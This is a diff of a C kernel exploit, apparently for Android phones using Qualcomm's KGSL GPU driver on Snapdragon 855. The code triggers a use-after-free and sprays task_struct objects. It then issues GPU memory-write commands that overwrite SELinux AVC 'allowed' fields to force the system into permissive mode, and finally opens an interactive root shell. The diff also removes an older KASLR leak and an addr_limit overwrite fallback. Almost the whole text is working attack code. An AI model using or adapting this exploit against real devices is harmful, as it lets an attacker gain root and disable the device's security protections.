@@ -25,112 +25,7 @@
 #include <dirent.h>
 #include <time.h>
 #include <signal.h>
-#include <sys/syscall.h>
-#include <asm/unistd.h>
 
-/* ========== perf_event 用の定義 (NDK 不足対策) ========== */
-#ifndef __NR_perf_event_open
-# if defined(__aarch64__)
-#  define __NR_perf_event_open 241
-# elif defined(__arm__)
-#  define __NR_perf_event_open 364
-# else
-#  define __NR_perf_event_open 0   /* fallback */
-# endif
-#endif
-
-/* perf_event 構造体 (最小限) */
-struct perf_event_attr {
-    uint32_t type;
-    uint32_t size;
-    uint64_t config;
-    uint64_t sample_period;
-    uint64_t sample_freq;
-    uint64_t sample_type;
-    uint64_t read_format;
-    uint64_t disabled       : 1;
-    uint64_t inherit        : 1;
-    uint64_t pinned         : 1;
-    uint64_t exclusive      : 1;
-    uint64_t exclude_user   : 1;
-    uint64_t exclude_kernel : 1;
-    uint64_t exclude_hv     : 1;
-    uint64_t exclude_idle   : 1;
-    uint64_t mmap           : 1;
-    uint64_t comm           : 1;
-    uint64_t freq           : 1;
-    uint64_t inherit_stat   : 1;
-    uint64_t enable_on_exec : 1;
-    uint64_t task           : 1;
-    uint64_t watermark      : 1;
-    uint64_t precise_ip     : 2;
-    uint64_t mmap_data      : 1;
-    uint64_t sample_id_all  : 1;
-    uint64_t exclude_host   : 1;
-    uint64_t exclude_guest  : 1;
-    uint64_t exclude_callchain_kernel : 1;
-    uint64_t exclude_callchain_user   : 1;
-    uint64_t mmap2          : 1;
-    uint64_t comm_exec      : 1;
-    uint64_t use_clockid    : 1;
-    uint64_t context_switch : 1;
-    uint64_t write_backward : 1;
-    uint64_t namespaces     : 1;
-    uint64_t ksymbol        : 1;
-    uint64_t bpf_event      : 1;
-    uint64_t aux_output     : 1;
-    uint64_t cgroup         : 1;
-    uint64_t text_poke      : 1;
-    uint64_t __reserved_1   : 30;
-    uint64_t __reserved_2   : 32;
-    uint32_t size2;
-    uint32_t __reserved_3;
-};
-
-#define PERF_TYPE_HARDWARE		0
-#define PERF_COUNT_HW_CPU_CYCLES	0
-#define PERF_SAMPLE_IP			1ULL
-
-/* perf_event ioctl コマンド */
-#define PERF_EVENT_IOC_RESET		_IO('$', 0)
-#define PERF_EVENT_IOC_ENABLE		_IO('$', 1)
-#define PERF_EVENT_IOC_DISABLE		_IO('$', 2)
-
-struct perf_event_mmap_page {
-    uint32_t version;
-    uint32_t compat_version;
-    uint32_t lock;
-    uint32_t index;
-    int64_t offset;
-    uint64_t time_enabled;
-    uint64_t time_running;
-    uint64_t capability;
-    uint64_t pmc_width;
-    uint64_t time_shift;
-    uint32_t time_mult;
-    uint32_t time_offset;
-    uint64_t time_zero;
-    uint32_t size;
-    uint32_t __reserved_1;
-    uint64_t data_offset;
-    uint64_t data_size;
-    uint64_t data_head;
-    uint64_t data_tail;
-    uint64_t data_offset_ext;
-    uint64_t data_size_ext;
-    uint64_t __reserved_2[4];
-};
-
-#define PERF_RECORD_MISC_KERNEL		(1 << 1)
-#define PERF_RECORD_SAMPLE		9
-
-struct perf_event_header {
-    uint32_t type;
-    uint16_t misc;
-    uint16_t size;
-};
-
-/* ========== KGSL ioctl 定義 ========== */
 #define KGSL_IOC_TYPE 0x09
 
 struct kgsl_gpuobj_alloc {
@@ -177,49 +72,33 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_CMDLIST_IB 0x00000001U
 #define KGSL_TIMESTAMP_RETIRED 0x00000002
 
-/* ========== UAF レイアウト ========== */
-#define UAF_ADDR      0x7001ff000ULL
-#define UAF_SIZE      0x10004000ULL
-#define OVERLAP_ADDR  0x7001fe000ULL
-#define OVERLAP_SIZE  0x7000ULL
-#define BOGUS_ADDR    0x700204000ULL
-#define BOGUS_SIZE    0xffffffffffefd000ULL
+/* sauce と同一の定数 (Phase 1-3) */
+#define UAF_ADDR  0x7001ff000ULL
+#define UAF_SIZE  0x10004000ULL
+#define OVERLAP_ADDR 0x7001fe000ULL
+#define OVERLAP_SIZE 0x7000ULL
+#define BOGUS_ADDR 0x700204000ULL
+#define BOGUS_SIZE 0xffffffffffefd000ULL
 #define PLACEHOLDER_ADDR 0x710204000ULL
 #define PLACEHOLDER_SIZE 0x10400000ULL
 
-/* ========== avc_node オフセット (標準カーネル) ========== */
-#define AVC_SSID_OFF     0x00
-#define AVC_TSID_OFF     0x04
-#define AVC_TCLASS_OFF   0x08
-#define AVC_ALLOWED_OFF  0x0c
-
+/* AVC flip 定数 */
 #define AVC_ENFORCE_PATH "/sys/fs/selinux/enforce"
 #define AVC_NODE_STRIDE  72
 #define AVC_NODES_PER_PAGE (4096 / AVC_NODE_STRIDE)
 #define AVC_PAGES_PER_IB 12
-#define AVC_LOOP_SECONDS 120
+#define AVC_LOOP_SECONDS 150
 
-/* ========== スプレー & スキャン ========== */
 #define SPRAY_PIDS 2000
-#define CHURN_MAX_PATHS 20000      /* 重複を解消 */
-#define SCAN_DWORDS 560
-
-/* ========== カーネルシンボル (Galaxy A90 ベース) ========== */
-#define VMLINUX_TEXT            0xffffffc010080000ULL
-#define VMLINUX_INIT_CRED       0xffffffc012D97D08ULL
-#define VMLINUX_SELINUX_ENFORCING 0xffffffc01240744cULL
-
-#define ADDR_LIMIT_OFFSET       0x40
-#define TASK_COMM_OFF           0x818
+#define CHURN_MAX_PATHS 4096
 
 static int kgsl_fd = -1;
 static volatile int race_done = 0;
 static uint64_t alloc_flags = 0;
 static int uaf_id = -1, ph_id = -1;
-static uint64_t kbase = 0;
-static uint64_t selinux_enforcing_addr = 0;
 
-/* ============ KGSL 基本操作 ============ */
+/* ============ KGSL 基本操作 (sauce と同パターン) ============ */
+
 static void die(const char *msg) { perror(msg); exit(1); }
 
 static uint32_t pm4_parity(uint32_t v) {
@@ -293,69 +172,8 @@ static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
     return ret;
 }
 
-/* ============ KASLR 検出 (perf) ============ */
-static uint64_t detect_kaslr(void) {
-    struct perf_event_attr pe = {0};
-    pe.type = PERF_TYPE_HARDWARE;
-    pe.size = sizeof(pe);
-    pe.config = PERF_COUNT_HW_CPU_CYCLES;
-    pe.sample_type = PERF_SAMPLE_IP;
-    pe.sample_period = 100;
-    pe.disabled = 1;
-    pe.exclude_kernel = 0;
-    pe.exclude_hv = 1;
-    pe.exclude_user = 1;
+/* ============ Phase A1-A4: 自前 UAF 作成 (sauce Phase 1-4 移植) ============ */
 
-    int fd = syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
-    if (fd < 0) { printf("  perf_open: errno=%d\n", errno); return 0; }
-
-    int npages = 256;
-    size_t mmap_size = (1 + npages) * 4096;
-    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
-    if (buf == MAP_FAILED) { close(fd); return 0; }
-
-    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
-    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
-    usleep(500000);
-    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
-
-    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
-    uint64_t head = pmp->data_head;
-    uint64_t tail = pmp->data_tail;
-
-    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
-    uint64_t data_size = pmp->data_size;
-
-    uint64_t first_kernel_ip = 0;
-    int n_ips = 0;
-
-    while (tail < head) {
-        uint64_t idx = tail & (data_size - 1);
-        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
-        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
-            n_ips++;
-            uint64_t ip = *(uint64_t *)(hdr + 1);
-            if (first_kernel_ip == 0) first_kernel_ip = ip;
-            if (n_ips <= 3) printf("    IP[%d]=0x%lX\n", n_ips, (unsigned long)ip);
-        }
-        tail += hdr->size;
-    }
-
-    munmap(buf, mmap_size); close(fd);
-    printf("    kernel_samples=%d\n", n_ips);
-
-    if (n_ips == 0) { printf("  perf: no kernel IPs\n"); return 0; }
-
-    uint64_t kaslr = (first_kernel_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
-    uint64_t ic_addr = VMLINUX_INIT_CRED + kaslr;
-    printf("    first_kernel_ip=0x%lX kaslr=0x%lX init_cred=0x%lX\n",
-        (unsigned long)first_kernel_ip, (unsigned long)kaslr, (unsigned long)ic_addr);
-    kbase = kaslr;
-    selinux_enforcing_addr = kbase + VMLINUX_SELINUX_ENFORCING;
-    return ic_addr;
-}
-
-/* ============ Phase 1-4: UAF トリガー ============ */
 static void phase1_rbtree(void) {
     alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
     uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
@@ -423,7 +241,8 @@ static void phase4_reclaim(void) {
     usleep(10000);
 }
 
-/* ============ チャーン ============ */
+/* ============ チャーン (AVC miss 生成) ============ */
+
 static const char *churn_dirs[] = {
     "/sys/kernel", "/sys/devices", "/sys/module", "/sys/class",
     "/proc/sys", "/proc/irq", "/proc/1", "/proc/2", "/proc/3",
@@ -432,6 +251,7 @@ static const char *churn_dirs[] = {
     "/system/lib64", "/data/data", "/data/app", "/data/user/0",
     "/dev", "/proc",
 };
+#define CHURN_MAX_PATHS 20000
 static char churn_paths[CHURN_MAX_PATHS][160];
 static int churn_npaths = 0;
 static int churn_built = 0;
@@ -498,6 +318,7 @@ static int avc_entries(void) {
     return e;
 }
 
+/* setenforce 0: 書き込み成功 (flip 成功 or 既に permissive) で 1 */
 static int try_setenforce0(void) {
     int fd = open(AVC_ENFORCE_PATH, O_WRONLY);
     if (fd < 0) return 0;
@@ -506,10 +327,11 @@ static int try_setenforce0(void) {
     return (w == 1);
 }
 
-/* ============ AVC フリップ & task_struct スキャン ============ */
+/* ============ GPU スキャン + flip ============ */
+
+/* UAF 範囲の全ページから TASKUAF!! comm を含む task_struct ページを記録 */
 #define PRE_SCAN_DWORDS 560
 #define PRE_PAGES_PER_IB 4
-
 static int prescan_task_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                               void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
                               uint64_t scan_start, uint64_t end_va,
@@ -556,6 +378,10 @@ static int prescan_task_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
     return n;
 }
 
+/*
+ * AVC ノードをスキャンし、(tsid==2 && tclass==1) のノードの allowed を 0xffffffff に書き換える
+ * Snapdragon 855 用オフセット: ssid=0x20, tsid=0x24, tclass=0x28, allowed=0x2c
+ */
 static int scan_flip_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                            void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
                            uint64_t *vas, int npages, int verbose) {
@@ -572,6 +398,8 @@ static int scan_flip_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
         memset(dst_m, 0, node_dws * 4);
         int dw = 0;
         cmd[dw++] = cp_type7(CP_NOP, 0);
+
+        /* 各ページの AVC ノードを読み込む (オフセット 0x20 から) */
         for (int p = 0; p < batch; p++) {
             uint64_t va = vas[idx + p];
             for (int n = 0; n < AVC_NODES_PER_PAGE; n++) {
@@ -580,7 +408,7 @@ static int scan_flip_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                     uint32_t dl, dh, sl, sh;
                     uint32_t dofs = (p * AVC_NODES_PER_PAGE + n) * 4 + w * 4;
                     split64(dst_ga + dofs, &dl, &dh);
-                    split64(node_va + (AVC_SSID_OFF + w * 4), &sl, &sh);
+                    split64(node_va + 0x20 + w * 4, &sl, &sh);  // ssid は 0x20 から
                     cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
                     cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
                     cmd[dw++] = sl; cmd[dw++] = sh;
@@ -593,6 +421,7 @@ static int scan_flip_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
         if (wait_timestamp(ctx_id, ts) < 0) break;
         __sync_synchronize();
 
+        /* 条件に合うノードを探して allowed を書き換え */
         int fdw = 0, nb_flips = 0;
         uint32_t *fcmd = (uint32_t *)ib_m;
         fcmd[fdw++] = cp_type7(CP_NOP, 0);
@@ -604,7 +433,8 @@ static int scan_flip_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                 uint32_t tsid = nd[1];
                 uint16_t tclass = (uint16_t)(nd[2] & 0xffff);
                 if (ssid >= 1 && ssid <= 0x3fff && tsid == 2 && tclass == 1) {
-                    uint64_t allowed_va = va + n * AVC_NODE_STRIDE + AVC_ALLOWED_OFF;
+                    /* allowed は 0x2c オフセット */
+                    uint64_t allowed_va = va + n * AVC_NODE_STRIDE + 0x2c;
                     uint32_t sl, sh;
                     split64(allowed_va, &sl, &sh);
                     fcmd[fdw++] = cp_type7(CP_MEM_WRITE, 4);
@@ -613,9 +443,9 @@ static int scan_flip_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                     fcmd[fdw++] = 0;
                     nb_flips++;
                     if (verbose)
-                        printf("[FLIP] va=0x%lx+0x%x sid=0x%x ts=0x%x class=0x%x allowed->0xffffffff\n",
-                            (unsigned long)va, n * AVC_NODE_STRIDE + AVC_ALLOWED_OFF,
-                            ssid, tsid, tclass);
+                        printf("[FLIP] va=0x%lx+0x%x sid=0x%x ts=0x%x allowed->0xffffffff\n",
+                            (unsigned long)va, n * AVC_NODE_STRIDE + 0x2c,
+                            ssid, tsid);
                 }
             }
         }
@@ -631,7 +461,8 @@ static int scan_flip_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
     return total_flips;
 }
 
-/* ============ task_struct スプレー & フォールバック ============ */
+/* ============ task_struct spray (UAF ページ保持) ============ */
+
 static pid_t spray_pids[SPRAY_PIDS];
 static int n_spray = 0;
 
@@ -650,112 +481,54 @@ static void spawn_spray(void) {
 }
 
 static void kill_spray_children(void) {
-    for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
+    int killed = 0;
+    for (int i = 0; i < n_spray; i++) {
+        kill(spray_pids[i], SIGKILL);
+        killed++;
+    }
     while (waitpid(-1, NULL, 0) > 0) ;
-    printf("[KILL] all spray children killed\n");
+    printf("[KILL] %d spray children killed+reaped\n", killed);
 }
 
-static int find_task_struct(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
-                            void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
-                            uint64_t *out_va) {
-    uint32_t *cmd = (uint32_t *)ib_m;
-    uint32_t *data = (uint32_t *)dst_m;
-    int dw;
-    unsigned int ts;
-
-    for (uint64_t va = UAF_ADDR + 0x2000; va < UAF_ADDR + UAF_SIZE - 0x1000; va += 0x1000) {
-        memset(ib_m, 0, 0x10000);
-        memset(dst_m, 0, 0x1000);
-        dw = 0;
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        for (int i = 0; i < SCAN_DWORDS; i++) {
-            uint32_t dl, dh, sl, sh;
-            split64(dst_ga + i * 4, &dl, &dh);
-            split64(va + i * 4, &sl, &sh);
-            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
-            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
-            cmd[dw++] = sl; cmd[dw++] = sh;
-        }
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        __sync_synchronize();
-        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
-        if (wait_timestamp(ctx_id, ts) < 0) break;
-        __sync_synchronize();
-
-        int found = 0;
-        for (int off = 0; off < SCAN_DWORDS - 8; off++) {
-            if (data[off] == 0x4B534154 && data[off+1] == 0x21464155) {
-                found = 1;
-                break;
-            }
-        }
-        if (found) {
-            *out_va = va;
-            return 1;
-        }
+/* ルートシェル (xh 互換) */
+static void root_shell(void) {
+    printf("\n  # ROOT SHELL (uid=0) - type exit to quit\n  # ");
+    fflush(stdout);
+    char buf[512];
+    while (fgets(buf, sizeof(buf), stdin) != NULL) {
+        if (strncmp(buf, "exit", 4) == 0 || strncmp(buf, "quit", 4) == 0) break;
+        buf[strcspn(buf, "\n")] = 0;
+        if (buf[0] == 0) continue;
+        int st = system(buf);
+        (void)st;
+        printf("# ");
+        fflush(stdout);
     }
-    return 0;
+    printf("[-] Root shell exited\n");
 }
 
-static void overwrite_addr_limit(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
-                                 void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
-                                 uint64_t task_va) {
-    uint32_t *cmd = (uint32_t *)ib_m;
-    int dw = 0;
-    uint64_t addr_limit_va = task_va + ADDR_LIMIT_OFFSET;
-    uint64_t kernel_ds = 0xFFFFFFFFFFFFFFFFULL;
+/* ============ main ============ */
 
-    memset(ib_m, 0, 0x10000);
-    dw = 0;
-    cmd[dw++] = cp_type7(CP_NOP, 0);
-
-    uint32_t lo, hi;
-    split64(addr_limit_va, &lo, &hi);
-    cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
-    cmd[dw++] = lo; cmd[dw++] = hi;
-    cmd[dw++] = (uint32_t)(kernel_ds & 0xFFFFFFFF);
-
-    split64(addr_limit_va + 4, &lo, &hi);
-    cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
-    cmd[dw++] = lo; cmd[dw++] = hi;
-    cmd[dw++] = (uint32_t)(kernel_ds >> 32);
-
-    cmd[dw++] = cp_type7(CP_NOP, 0);
-    __sync_synchronize();
-    unsigned int ts;
-    if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) == 0) {
-        wait_timestamp(ctx_id, ts);
-        printf("[+] addr_limit overwritten to KERNEL_DS at 0x%lx\n", (unsigned long)addr_limit_va);
-    } else {
-        printf("[-] Failed to submit addr_limit overwrite\n");
-    }
-}
-
-/* ============ メイン ============ */
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
     bool want_shell = false;
     for (int i = 1; i < argc; i++)
         if (strcmp(argv[i], "-i") == 0) want_shell = true;
 
-    printf("[*] avc_bypass (855 optimized) uid=%d euid=%d\n", getuid(), geteuid());
+    printf("[*] avc_bypass v2: uid=%d euid=%d\n", getuid(), geteuid());
     {
         int fd = open("/proc/self/attr/current", O_RDONLY);
         if (fd >= 0) {
-            char ctx[256]; ssize_t n = read(fd, ctx, sizeof(ctx)-1);
+            char ctx[256]; ssize_t n = read(fd, ctx, sizeof(ctx) - 1);
             close(fd);
             if (n > 0) { ctx[n] = 0; printf("[*] SELinux: %s\n", ctx); }
         }
     }
 
+    /* ===== 自前 UAF 作成 ===== */
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
     if (kgsl_fd < 0) die("open kgsl");
     printf("[+] kgsl fd=%d\n", kgsl_fd);
-
-    printf("[*] Phase 0: KASLR detection\n");
-    uint64_t init_cred = detect_kaslr();
-    if (init_cred == 0) { close(kgsl_fd); return 1; }
-    printf("  kbase=0x%lx selinux_enforcing=0x%lx\n", (unsigned long)kbase, (unsigned long)selinux_enforcing_addr);
 
     printf("[*] Phase 1: Setup rbtree\n");
     phase1_rbtree();
@@ -769,6 +542,7 @@ int main(int argc, char **argv) {
     printf("[*] Phase 4: Reclaim\n");
     phase4_reclaim();
 
+    /* ===== spray: UAF ページを task_struct で保持 ===== */
     spawn_spray();
 
     unsigned int ctx_id = create_context();
@@ -786,6 +560,7 @@ int main(int argc, char **argv) {
 
     printf("[GPU] ib_ga=0x%lx dst_ga=0x%lx\n", (unsigned long)ib_ga, (unsigned long)dst_ga);
 
+    /* UAF 写像の健全性チェック: 先頭 1KB の非ゼロ dword 数 (task_struct が載っていれば非ゼロ) */
     {
         uint32_t *cmd = (uint32_t *)ib_m;
         int dw = 0;
@@ -810,26 +585,29 @@ int main(int argc, char **argv) {
             uint32_t *data = (uint32_t *)dst_m;
             for (int i = 0; i < 256; i++) if (data[i] != 0) nz++;
         }
-        printf("[UAF] sanity: nonzero dwords=%d/256 %s\n", nz, nz > 0 ? "(UAF alive)" : "(UAF looks empty)");
+        printf("[UAF] sanity: nonzero dwords=%d/256 %s\n", nz,
+            nz > 0 ? "(UAF alive)" : "(UAF looks empty)");
     }
 
+    /* 1. プリスキャン: TASKUAF!! ページ記録 (kill 前に実施) */
     uint64_t task_pgs[4096];
     int n_task_pgs = prescan_task_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
         UAF_ADDR + 0x2000, UAF_ADDR + UAF_SIZE - 0x1000, task_pgs, 4096);
     printf("[*] pre-scan: %d task pages\n", n_task_pgs);
 
+    /* 2. spray 子を kill (UAF ページを unmovable free として buddy へ) */
     kill_spray_children();
-    usleep(100000);
-
+    usleep(100000);   /* 空 slab の buddy 返却待ち (直後に新 slab = タスクページ) */
+    /* freelist を消費させ、以降の新 slab をタスクページに強制する */
     churn_build();
-    for (int c = 0; c < 5; c++) churn_round();
+    for (int c = 0; c < 3; c++) churn_round();
     printf("[AVC] entries=%d (post-churn)\n", avc_entries());
 
+    /* 3. フリップループ (最長 AVC_LOOP_SECONDS) */
     int flip_total = 0;
     int ok = 0;
     uint64_t t_start = time(NULL);
     uint64_t t_last_report = t_start;
-
     while (!ok && time(NULL) - t_start < AVC_LOOP_SECONDS) {
         int f1 = 0, f2 = 0;
         for (int i = n_task_pgs - 1; i >= 0; i -= AVC_PAGES_PER_IB) {
@@ -868,38 +646,18 @@ int main(int argc, char **argv) {
 
     if (ok) {
         printf("[+] ### SETENFORCE 0 SUCCEEDED — SELinux permissive ###\n");
-        if (want_shell && getuid() == 0) {
-            printf("\n  # ROOT SHELL (uid=0, SELinux permissive) - type exit to quit\n  # ");
-            fflush(stdout);
-            char buf[512];
-            while (fgets(buf, sizeof(buf), stdin) != NULL) {
-                if (strncmp(buf, "exit", 4) == 0 || strncmp(buf, "quit", 4) == 0) break;
-                buf[strcspn(buf, "\n")] = 0;
-                if (buf[0] == 0) continue;
-                int st = system(buf); (void)st;
-                printf("# ");
-                fflush(stdout);
-            }
+    } else {
+        printf("[-] AVC bypass failed (flips=%d, 90s timeout)\n", flip_total);
+    }
+    {
+        int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
+        if (fd >= 0) {
+            char v[8]; ssize_t n = read(fd, v, sizeof(v) - 1);
+            close(fd);
+            if (n > 0) { v[n] = 0; printf("[*] getenforce: %s\n", v); }
         }
-        return 0;
     }
 
-    /* ---- フォールバック (簡易) ---- */
-    printf("[*] AVC flip failed after %d flips, falling back to addr_limit method\n", flip_total);
-    spawn_spray();
-    usleep(100000);
-    uint64_t task_va = 0;
-    if (!find_task_struct(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id, &task_va)) {
-        printf("[-] Fallback: no task_struct with marker found\n");
-        goto cleanup;
-    }
-    printf("[*] Fallback: found task_struct at 0x%lx\n", (unsigned long)task_va);
-    overwrite_addr_limit(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id, task_va);
-    printf("[!] Fallback incomplete: need to trigger target process to write selinux_enforcing.\n");
-
-cleanup:
-    for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
-    while (wait(NULL) > 0);
-    close(kgsl_fd);
-    return 1;
+    if (want_shell && getuid() == 0) root_shell();
+    return ok ? 0 : 1;
 }
